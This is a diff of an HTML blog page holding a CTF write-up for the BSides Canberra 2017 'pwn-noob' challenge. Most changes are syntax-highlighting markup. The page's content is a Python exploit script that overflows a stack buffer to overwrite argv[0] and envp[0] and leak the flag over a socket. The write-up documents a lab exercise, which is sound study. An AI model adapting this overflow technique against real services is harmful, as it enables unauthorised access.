@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-AU">
   <head>
-    <meta name="generator" content="Hugo 0.20.5" />
+    <meta name="generator" content="Hugo 0.20.2" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BSides Canberra pwn-noob CTF Write-up | 0xbc&#39;s blog</title>
@@ -117,7 +117,76 @@ article [itemprop="description"] {
   }
 }
 
-      
+      .highlight .hll { background-color: #49483e }
+.highlight  { background: #272822; color: #f8f8f2 }
+.highlight .c { color: #75715e } /* Comment */
+.highlight .err { color: #960050; background-color: #1e0010 } /* Error */
+.highlight .k { color: #66d9ef } /* Keyword */
+.highlight .l { color: #ae81ff } /* Literal */
+.highlight .n { color: #f8f8f2 } /* Name */
+.highlight .o { color: #f92672 } /* Operator */
+.highlight .p { color: #f8f8f2 } /* Punctuation */
+.highlight .ch { color: #75715e } /* Comment.Hashbang */
+.highlight .cm { color: #75715e } /* Comment.Multiline */
+.highlight .cp { color: #75715e } /* Comment.Preproc */
+.highlight .cpf { color: #75715e } /* Comment.PreprocFile */
+.highlight .c1 { color: #75715e } /* Comment.Single */
+.highlight .cs { color: #75715e } /* Comment.Special */
+.highlight .gd { color: #f92672 } /* Generic.Deleted */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gi { color: #a6e22e } /* Generic.Inserted */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #75715e } /* Generic.Subheading */
+.highlight .kc { color: #66d9ef } /* Keyword.Constant */
+.highlight .kd { color: #66d9ef } /* Keyword.Declaration */
+.highlight .kn { color: #f92672 } /* Keyword.Namespace */
+.highlight .kp { color: #66d9ef } /* Keyword.Pseudo */
+.highlight .kr { color: #66d9ef } /* Keyword.Reserved */
+.highlight .kt { color: #66d9ef } /* Keyword.Type */
+.highlight .ld { color: #e6db74 } /* Literal.Date */
+.highlight .m { color: #ae81ff } /* Literal.Number */
+.highlight .s { color: #e6db74 } /* Literal.String */
+.highlight .na { color: #a6e22e } /* Name.Attribute */
+.highlight .nb { color: #f8f8f2 } /* Name.Builtin */
+.highlight .nc { color: #a6e22e } /* Name.Class */
+.highlight .no { color: #66d9ef } /* Name.Constant */
+.highlight .nd { color: #a6e22e } /* Name.Decorator */
+.highlight .ni { color: #f8f8f2 } /* Name.Entity */
+.highlight .ne { color: #a6e22e } /* Name.Exception */
+.highlight .nf { color: #a6e22e } /* Name.Function */
+.highlight .nl { color: #f8f8f2 } /* Name.Label */
+.highlight .nn { color: #f8f8f2 } /* Name.Namespace */
+.highlight .nx { color: #a6e22e } /* Name.Other */
+.highlight .py { color: #f8f8f2 } /* Name.Property */
+.highlight .nt { color: #f92672 } /* Name.Tag */
+.highlight .nv { color: #f8f8f2 } /* Name.Variable */
+.highlight .ow { color: #f92672 } /* Operator.Word */
+.highlight .w { color: #f8f8f2 } /* Text.Whitespace */
+.highlight .mb { color: #ae81ff } /* Literal.Number.Bin */
+.highlight .mf { color: #ae81ff } /* Literal.Number.Float */
+.highlight .mh { color: #ae81ff } /* Literal.Number.Hex */
+.highlight .mi { color: #ae81ff } /* Literal.Number.Integer */
+.highlight .mo { color: #ae81ff } /* Literal.Number.Oct */
+.highlight .sa { color: #e6db74 } /* Literal.String.Affix */
+.highlight .sb { color: #e6db74 } /* Literal.String.Backtick */
+.highlight .sc { color: #e6db74 } /* Literal.String.Char */
+.highlight .dl { color: #e6db74 } /* Literal.String.Delimiter */
+.highlight .sd { color: #e6db74 } /* Literal.String.Doc */
+.highlight .s2 { color: #e6db74 } /* Literal.String.Double */
+.highlight .se { color: #ae81ff } /* Literal.String.Escape */
+.highlight .sh { color: #e6db74 } /* Literal.String.Heredoc */
+.highlight .si { color: #e6db74 } /* Literal.String.Interpol */
+.highlight .sx { color: #e6db74 } /* Literal.String.Other */
+.highlight .sr { color: #e6db74 } /* Literal.String.Regex */
+.highlight .s1 { color: #e6db74 } /* Literal.String.Single */
+.highlight .ss { color: #e6db74 } /* Literal.String.Symbol */
+.highlight .bp { color: #f8f8f2 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #a6e22e } /* Name.Function.Magic */
+.highlight .vc { color: #f8f8f2 } /* Name.Variable.Class */
+.highlight .vg { color: #f8f8f2 } /* Name.Variable.Global */
+.highlight .vi { color: #f8f8f2 } /* Name.Variable.Instance */
+.highlight .vm { color: #f8f8f2 } /* Name.Variable.Magic */
+.highlight .il { color: #ae81ff } /* Literal.Number.Integer.Long */
 
     </style>
     
@@ -148,7 +217,7 @@ article [itemprop="description"] {
 
 
 <meta itemprop="dateModified" content="2017-04-25T21:53:48&#43;09:30" />
-<meta itemprop="wordCount" content="213">
+<meta itemprop="wordCount" content="227">
 
 
 
@@ -161,7 +230,7 @@ article [itemprop="description"] {
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
-<span>1 minute read</span>
+<span>2 minute read</span>
 <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
@@ -180,65 +249,73 @@ article [itemprop="description"] {
       <p>Coming soon&hellip;</p>
 
 <p>
-<img src="/img/pwn-noob-main.png" style="width:100%"/>Disassembly</img> is fun!</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">struct</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>
+<img src="/img/pwn-noob-main.png" style="width:100%"/>Disassembly</img> is fun!
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">sys</span>
  
-<span style="color: #75715e"># pwn-noob.py</span>
-<span style="color: #75715e"># exploit for https://github.com/OJ/bsides-2017-ctf-docker/tree/master/pwn-noob</span>
+<span class="c1"># pwn-noob.py</span>
+<span class="c1"># exploit for https://github.com/OJ/bsides-2017-ctf-docker/tree/master/pwn-noob</span>
  
-<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">p</span><span style="color: #f8f8f2">(addr):</span>
-    <span style="color: #75715e"># encode addresses as 64-bit little-endian</span>
-    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">struct</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">pack(</span><span style="color: #e6db74">&quot;&lt;Q&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">addr)</span>
+<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="c1"># encode addresses as 64-bit little-endian</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
  
-<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">:</span>
-    <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Usage: pwn-noob.py [host] [port] (defaults to localhost 6000)&quot;</span>
-    <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">exit()</span>
-<span style="color: #66d9ef">elif</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">:</span>
-    <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
-    <span style="color: #f8f8f2">port</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">int(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">])</span>
-<span style="color: #66d9ef">elif</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:</span>
-    <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
-    <span style="color: #f8f8f2">port</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">6000</span>
-<span style="color: #66d9ef">elif</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
-    <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;localhost&#39;</span>
-    <span style="color: #f8f8f2">port</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">6000</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s2">&quot;Usage: pwn-noob.py [host] [port] (defaults to localhost 6000)&quot;</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">6000</span>
+<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">6000</span>
  
-<span style="color: #f8f8f2">envstring</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;TERM=a&#39;</span>   <span style="color: #75715e"># it doesn&#39;t actually matter what you set TERM to,</span>
-                       <span style="color: #75715e"># so long as it&#39;s set</span>
+<span class="n">envstring</span> <span class="o">=</span> <span class="s1">&#39;TERM=a&#39;</span>   <span class="c1"># it doesn&#39;t actually matter what you set TERM to,</span>
+                       <span class="c1"># so long as it&#39;s set</span>
 
-<span style="color: #f8f8f2">flag_addr</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0x400800</span>   <span style="color: #75715e"># determined by inspecting the binary</span>
+<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x400800</span>   <span class="c1"># determined by inspecting the binary</span>
 
-<span style="color: #f8f8f2">buffer_addr</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0x601040</span> <span style="color: #75715e"># determined by inspecting the binary</span>
+<span class="n">buffer_addr</span> <span class="o">=</span> <span class="mh">0x601040</span> <span class="c1"># determined by inspecting the binary</span>
 
-<span style="color: #f8f8f2">flag_start_len</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">264</span>   <span style="color: #75715e"># determined by trial-and-error</span>
+<span class="n">flag_start_len</span> <span class="o">=</span> <span class="mi">264</span>   <span class="c1"># determined by trial-and-error</span>
 
-<span style="color: #f8f8f2">envp_start_len</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">8</span>     <span style="color: #75715e"># skip over 8 bytes of NULL at the end of </span>
-                       <span style="color: #75715e"># the argv array to get to envp[0]</span>
+<span class="n">envp_start_len</span> <span class="o">=</span> <span class="mi">8</span>     <span class="c1"># skip over 8 bytes of NULL at the end of </span>
+                       <span class="c1"># the argv array to get to envp[0]</span>
  
-<span style="color: #75715e"># newlines required to finish calls to fgets (0x4006e9, 0x40072e)</span>
-<span style="color: #f8f8f2">payload1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">envstring</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span>
-<span style="color: #f8f8f2">payload2</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;A&#39;</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">flag_start_len</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">p(flag_addr)</span> <span style="color: #f92672">+</span> 
-            <span style="color: #e6db74">&#39;B&#39;</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">envp_start_len</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">p(buffer_addr)</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span>
+<span class="c1"># newlines required to finish calls to fgets (0x4006e9, 0x40072e)</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">envstring</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">flag_start_len</span> <span class="o">+</span> <span class="n">p</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> 
+            <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="n">envp_start_len</span> <span class="o">+</span> <span class="n">p</span><span class="p">(</span><span class="n">buffer_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
  
-<span style="color: #f8f8f2">s</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM)</span>
-<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">connect((host,</span> <span style="color: #f8f8f2">port))</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  
-<span style="color: #75715e"># Print first prompt, send TERM string, which will be stored at buffer_addr</span>
-<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
-<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(payload1)</span>
+<span class="c1"># Print first prompt, send TERM string, which will be stored at buffer_addr</span>
+<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
  
-<span style="color: #75715e"># Print second prompt, send stack-smashing junk + argv[0] overwrite </span>
-<span style="color: #75715e"># + junk + envp[0] overwrite</span>
-<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
-<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(payload2)</span>
+<span class="c1"># Print second prompt, send stack-smashing junk + argv[0] overwrite </span>
+<span class="c1"># + junk + envp[0] overwrite</span>
+<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
  
-<span style="color: #75715e"># Print out the flag</span>
-<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
+<span class="c1"># Print out the flag</span>
+<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  
-<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
-</pre></div>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+</p>
+
+<p>Welp, that&rsquo;s all folks. Whaddya think?</p>
+
+<div class="alert alert-success">Thanks guys.</div>
+<div class="alert alert-info">Thanks guys.</div>
+<div class="alert alert-warning">Thanks guys.</div>
+<div class="alert alert-danger">Thanks guys.</div>
     </div>
     
     <footer>
@@ -259,7 +336,7 @@ article [itemprop="description"] {
   
     and tagged <a href="/tags/binary-exploitation/">binary-exploitation</a> and <a href="/tags/linux/">linux</a>
   
-  using <span itemprop="wordCount">213</span> words.
+  using <span itemprop="wordCount">227</span> words.
 </p>
 
       
